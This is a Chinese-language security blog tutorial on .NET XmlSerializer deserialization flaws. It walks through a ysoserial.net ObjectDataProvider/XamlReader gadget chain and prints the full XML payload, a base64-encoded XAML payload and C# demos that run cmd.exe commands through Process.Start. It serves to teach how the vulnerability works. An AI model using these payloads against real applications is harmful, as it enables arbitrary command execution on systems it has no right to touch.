# Dot NET-XmlSerializer反序列化漏洞

  
  
&lt;!--more--&gt;  
## XmlSerializer基础知识  
在.NET框架中的`XmlSerializer`类可以将高度结构化的XML数据映射为`.NET`对象。XmlSerializer类在程序中通过单个API调用来执行XML文档和对象之间的转换。转换的映射规则在`.NET`类中通过元数据属性来表示，如果程序开发人员使用`Type`类的静态方法获取外界数据，并调用`Desierialize`反序列化xml数据就会触发反序列化漏洞攻击。  
## XmlSerializer序列化  
`.NET`框架中`System.Xml.Serialization`命名空间下的`XmlSerializer`类可以将XML文件绑定到`.NET`类的实例，需要注意它只能把对象的公共属性和公共字段转换为`XML`元素或属性，并且由两个方法组成`Serialize()`用于从对象实例生成XML；`Deserialize()`用于将XML文档分析成对象图，被序列化的数据可以是数据、字段、数组、以及XMLElement和XmlAttribute对象格式的内嵌XML。  
Demo  
```c#  
using System;  
using System.IO;  
using System.Text;  
using System.Xml.Serialization;  
  
namespace XmlDeserialization  
{  
    [XmlRoot]  
    public class Person  
    {  
        [XmlElement]  
        public int age { get; set; }  
        [XmlElement]  
        public string name { get; set; }  
        [XmlAttribute]  
        public string friend { get; set; }  
    }  
    class Program  
    {  
        static void Main(string[] args)  
        {  
            Person p = new Person();  
            p.name = &#34;Tom&#34;;  
            p.age = 18;  
            p.friend = &#34;Jim&#34;;  
  
  
            XmlSerializer xmlSerializer = new XmlSerializer(typeof(Person));  
            MemoryStream memoryStream = new MemoryStream();  
            TextWriter writer = new StreamWriter(memoryStream);  
            xmlSerializer.Serialize(writer, p);  
            memoryStream.Position = 0;  
            // 输出xml  
            Console.WriteLine(Encoding.UTF8.GetString(memoryStream.ToArray()));  
        }  
    }  
}  
```  
![](https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202506031951440.png)
`XmlElement`指定属性要序列化为元素，XMLAttribute指定属性要序列化为特性，XmlRoot指定类要序列化为根元素；通过特性类型的属性、影响要生成的名称、名称空间和类型。在创建一个`Person`类的实例填充其属性为序列化为文件。XmlSerializer.Serialize方法重载可以接受Stream、TextWrite、XmlWrite类。  
## XmlSerialize反序列化  
反序列化就是把xml文件转换为对象是通过创建一个新对象的方式调用XmlSerializer.Deserialize方法实现的，在序列化最关键的一环当属new XmlSerializer构造方法里所传的参数，这个参数来自`System.Type`类，通过这个类可以访问关于任意数据类型的信息，指向任何给定类型的`Type`引用有以下三种方式。  
```c#  
typeof(Person) //表示获取Person类的Type  
p.GetType(); //获取Person类的Type  
Type.GetType(&#34;Person&#34;); //Type类的静态方法GetType，引入传入字符串，必须是全限定名  
```  
最经典的攻击类就是`ObjectDataProvider`，利用`yso`生成  
```powershell  
C:\Users\nlrvana\Desktop\ysoserial.net-master\ysoserial\bin\Release&gt;ysoserial.exe -g ObjectDataProvider -c calc -f xmlserializer  
&lt;?xml version=&#34;1.0&#34;?&gt;  
&lt;root type=&#34;System.Data.Services.Internal.ExpandedWrapper`2[[System.Windows.Markup.XamlReader, PresentationFramework, Version=4.0.0.0, Culture=neutral, PublicKeyToken=31bf3856ad364e35],[System.Windows.Data.ObjectDataProvider, PresentationFramework, Version=4.0.0.0, Culture=neutral, PublicKeyToken=31bf3856ad364e35]], System.Data.Services, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089&#34;&gt;  
    &lt;ExpandedWrapperOfXamlReaderObjectDataProvider xmlns:xsi=&#34;http://www.w3.org/2001/XMLSchema-instance&#34; xmlns:xsd=&#34;http://www.w3.org/2001/XMLSchema&#34; &gt;  
        &lt;ExpandedElement/&gt;  
        &lt;ProjectedProperty0&gt;  
            &lt;MethodName&gt;Parse&lt;/MethodName&gt;  
            &lt;MethodParameters&gt;  
                &lt;anyType xmlns:xsi=&#34;http://www.w3.org/2001/XMLSchema-instance&#34; xmlns:xsd=&#34;http://www.w3.org/2001/XMLSchema&#34; xsi:type=&#34;xsd:string&#34;&gt;  
                    &lt;![CDATA[&lt;ResourceDictionary xmlns=&#34;http://schemas.microsoft.com/winfx/2006/xaml/presentation&#34; xmlns:d=&#34;http://schemas.microsoft.com/winfx/2006/xaml&#34; xmlns:b=&#34;clr-namespace:System;assembly=mscorlib&#34; xmlns:c=&#34;clr-namespace:System.Diagnostics;assembly=system&#34;&gt;&lt;ObjectDataProvider d:Key=&#34;&#34; ObjectType=&#34;{d:Type c:Process}&#34; MethodName=&#34;Start&#34;&gt;&lt;ObjectDataProvider.MethodParameters&gt;&lt;b:String&gt;cmd&lt;/b:String&gt;&lt;b:String&gt;/c calc&lt;/b:String&gt;&lt;/ObjectDataProvider.MethodParameters&gt;&lt;/ObjectDataProvider&gt;&lt;/ResourceDictionary&gt;]]&gt;  
                &lt;/anyType&gt;  
            &lt;/MethodParameters&gt;  
            &lt;ObjectInstance xsi:type=&#34;XamlReader&#34;&gt;&lt;/ObjectInstance&gt;  
        &lt;/ProjectedProperty0&gt;  
    &lt;/ExpandedWrapperOfXamlReaderObjectDataProvider&gt;  
&lt;/root&gt;  
```  
来介绍一下这个payload  
### ObjectDataProvider  
ObjectDataProvider类，位于`System.Windows.Data`命名空间下，可以调用任意被引用类中的方法，提供成员`ObjectInstance`用类似实例化类、成员`MethodName`调用指定类型的方法的名称、成员`MethodParameters`表示传递给方法的参数。  
```c#  
ObjectDataProvider object1 = new ObjectDataProvider();  
object1.ObjectInstance = new Person();  
object1.MethodName = &#34;Evil&#34;;  
object1.MethodParameters.Add(&#34;calc.exe&#34;);  
```  
再给`Person`类定义一个`Evil`方法，代码实现调用`System.Diagnostics.Process.Start()`启动新的进程弹出计算器。如果用`XmlSerializer`直接序列化抛出异常，因为在序列化过程中`ObjectInstance`这个成员类型未知，不过可以使用`ExpandedWrapper`扩展类在系统内部预知先加载相关实体的查询来避免异常错误。  
Demo  
```c#  
using System;  
using System.Diagnostics;  
using System.IO;  
using System.Text;  
using System.Windows.Data;  
using System.Xml.Serialization;  
using System.Data.Services.Internal;  
  
  
namespace XmlDeserialization  
{  
    [XmlRoot]  
    public class Person  
    {  
        public void Evil(string cmd)  
        {  
            Process process = new Process();  
            process.StartInfo.FileName = &#34;cmd.exe&#34;;  
            process.StartInfo.Arguments = &#34;/c &#34; &#43; cmd;  
            process.Start();  
        }  
    }  
    class Program  
    {  
        static void Main(string[] args)  
        {  
            MemoryStream memoryStream = new MemoryStream();  
            TextWriter writer = new StreamWriter(memoryStream);  
            ExpandedWrapper&lt;Person, ObjectDataProvider&gt; expandedWrapper = new ExpandedWrapper&lt;Person, ObjectDataProvider&gt;();  
            expandedWrapper.ProjectedProperty0 = new ObjectDataProvider();  
            expandedWrapper.ProjectedProperty0.MethodName = &#34;Evil&#34;;  
            expandedWrapper.ProjectedProperty0.MethodParameters.Add(&#34;calc&#34;);  
            expandedWrapper.ProjectedProperty0.ObjectInstance = new Person();  
            XmlSerializer xml = new XmlSerializer(typeof(ExpandedWrapper&lt;Person, ObjectDataProvider&gt;));  
            xml.Serialize(writer, expandedWrapper);  
            string result = Encoding.UTF8.GetString(memoryStream.ToArray());  
            Console.WriteLine(result);  
  
            memoryStream.Position = 0;  
            xml.Deserialize(memoryStream);  
            Console.ReadKey();  
  
  
        }  
    }  
}  
```  
![](https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202506032051674.png)
但是这样显得就很鸡肋了。此时我们需要引入一个新的类`ResourceDictionary`  
### ResourceDictionary  
`ResorceDictionary`，也称为资源字典通常出现在`WPF`或`UWP`应用程序中用来在多个程序集间共享静态资源。既然是WPF程序，必然涉及到前端UI设计语言XAML。XAML全称`Extensinle Application Markup Language`基于XML的，且`XAML`是以一个树形结构作为整体。  
它是可以直接执行命令的  
Demo  
```xml  
&lt;ResourceDictionary   
                    xmlns=&#34;http://schemas.microsoft.com/winfx/2006/xaml/presentation&#34;   
                    xmlns:d=&#34;http://schemas.microsoft.com/winfx/2006/xaml&#34;   
                    xmlns:b=&#34;clr-namespace:System;assembly=mscorlib&#34;   
                    xmlns:c=&#34;clr-namespace:System.Diagnostics;assembly=system&#34;&gt;  
    &lt;ObjectDataProvider d:Key=&#34;&#34; ObjectType=&#34;{d:Type c:Process}&#34; MethodName=&#34;Start&#34;&gt;  
        &lt;ObjectDataProvider.MethodParameters&gt;  
            &lt;b:String&gt;cmd&lt;/b:String&gt;  
            &lt;b:String&gt;/c calc&lt;/b:String&gt;  
        &lt;/ObjectDataProvider.MethodParameters&gt;  
    &lt;/ObjectDataProvider&gt;  
&lt;/ResourceDictionary&gt;  
```  
这段xaml  

- xmlns:c 引用了System.Diagnostics命名空间起别名为c  
- d:Key=&#34;&#34; 起别名为空，在xaml语法中，Key这个键值必须有。  
- ObjectType表示对象类型  
- d:Type 等同于typeof()  
- MethodName是ObjectDataProvider的属性，传递一个Start等于调用Start方法。  
- c:Process等同于`System.Diagnostics.Process`  

整个xaml被解析之后，等同于创建了一个`ObjectDataProvider`对象，该对象又会自动调用`System.Diagnostics.Process.Start(&#34;cmd.exe&#34;.&#34;/c calc&#34;)`  
因为是xaml的语言，所以我们可以使用`XamlReader.Parse()`来解析它，运行之后弹出`calc`。其中`base64`的内容，正是上面的`payload`  
```c#  
using System;  
using System.Text;  
using System.Windows.Markup;  
  
namespace XmlDeserialization  
{  
    class Program  
    {  
        static void Main(string[] args)  
        {  
            string p = &#34;PFJlc291cmNlRGljdGlvbmFyeSAKICAgICAgICAgICAgICAgICAgICB4bWxucz0iaHR0cDovL3NjaGVtYXMubWljcm9zb2Z0LmNvbS93aW5meC8yMDA2L3hhbWwvcHJlc2VudGF0aW9uIiAKICAgICAgICAgICAgICAgICAgICB4bWxuczpkPSJodHRwOi8vc2NoZW1hcy5taWNyb3NvZnQuY29tL3dpbmZ4LzIwMDYveGFtbCIgCiAgICAgICAgICAgICAgICAgICAgeG1sbnM6Yj0iY2xyLW5hbWVzcGFjZTpTeXN0ZW07YXNzZW1ibHk9bXNjb3JsaWIiIAogICAgICAgICAgICAgICAgICAgIHhtbG5zOmM9ImNsci1uYW1lc3BhY2U6U3lzdGVtLkRpYWdub3N0aWNzO2Fzc2VtYmx5PXN5c3RlbSI&#43;CiAgICA8T2JqZWN0RGF0YVByb3ZpZGVyIGQ6S2V5PSIiIE9iamVjdFR5cGU9IntkOlR5cGUgYzpQcm9jZXNzfSIgTWV0aG9kTmFtZT0iU3RhcnQiPgogICAgICAgIDxPYmplY3REYXRhUHJvdmlkZXIuTWV0aG9kUGFyYW1ldGVycz4KICAgICAgICAgICAgPGI6U3RyaW5nPmNtZDwvYjpTdHJpbmc&#43;CiAgICAgICAgICAgIDxiOlN0cmluZz4vYyBjYWxjPC9iOlN0cmluZz4KICAgICAgICA8L09iamVjdERhdGFQcm92aWRlci5NZXRob2RQYXJhbWV0ZXJzPgogICAgPC9PYmplY3REYXRhUHJvdmlkZXI&#43;CjwvUmVzb3VyY2VEaWN0aW9uYXJ5Pg==&#34;;  
            byte[] vs = Convert.FromBase64String(p);  
            string xml = Encoding.UTF8.GetString(vs);  
            XamlReader.Parse(xml);  
            Console.ReadKey();  
        }  
    }  
}  
```  
此时，我们就可以直接用`ObjectDataProvider`调用`XamlReader.Parse()`方法了。  
此时我们再来看一下yso生成的payload，就一目了然了。  
```xml  
&lt;?xml version=&#34;1.0&#34;?&gt;  
&lt;root type=&#34;System.Data.Services.Internal.ExpandedWrapper`2[[System.Windows.Markup.XamlReader, PresentationFramework, Version=4.0.0.0, Culture=neutral, PublicKeyToken=31bf3856ad364e35],[System.Windows.Data.ObjectDataProvider, PresentationFramework, Version=4.0.0.0, Culture=neutral, PublicKeyToken=31bf3856ad364e35]], System.Data.Services, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089&#34;&gt;  
    &lt;ExpandedWrapperOfXamlReaderObjectDataProvider xmlns:xsi=&#34;http://www.w3.org/2001/XMLSchema-instance&#34; xmlns:xsd=&#34;http://www.w3.org/2001/XMLSchema&#34; &gt;  
        &lt;ExpandedElement/&gt;  
        &lt;ProjectedProperty0&gt;  
            &lt;MethodName&gt;Parse&lt;/MethodName&gt;  
            &lt;MethodParameters&gt;  
                &lt;anyType xmlns:xsi=&#34;http://www.w3.org/2001/XMLSchema-instance&#34; xmlns:xsd=&#34;http://www.w3.org/2001/XMLSchema&#34; xsi:type=&#34;xsd:string&#34;&gt;  
                    &lt;![CDATA[&lt;ResourceDictionary xmlns=&#34;http://schemas.microsoft.com/winfx/2006/xaml/presentation&#34; xmlns:d=&#34;http://schemas.microsoft.com/winfx/2006/xaml&#34; xmlns:b=&#34;clr-namespace:System;assembly=mscorlib&#34; xmlns:c=&#34;clr-namespace:System.Diagnostics;assembly=system&#34;&gt;&lt;ObjectDataProvider d:Key=&#34;&#34; ObjectType=&#34;{d:Type c:Process}&#34; MethodName=&#34;Start&#34;&gt;&lt;ObjectDataProvider.MethodParameters&gt;&lt;b:String&gt;cmd&lt;/b:String&gt;&lt;b:String&gt;/c calc&lt;/b:String&gt;&lt;/ObjectDataProvider.MethodParameters&gt;&lt;/ObjectDataProvider&gt;&lt;/ResourceDictionary&gt;]]&gt;  
                &lt;/anyType&gt;  
            &lt;/MethodParameters&gt;  
            &lt;ObjectInstance xsi:type=&#34;XamlReader&#34;&gt;&lt;/ObjectInstance&gt;  
        &lt;/ProjectedProperty0&gt;  
    &lt;/ExpandedWrapperOfXamlReaderObjectDataProvider&gt;  
&lt;/root&gt;  
```  

---

> Author: N1Rvana  
> URL: https://nlrvana.github.io/dot-net-xmlserializer%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/  

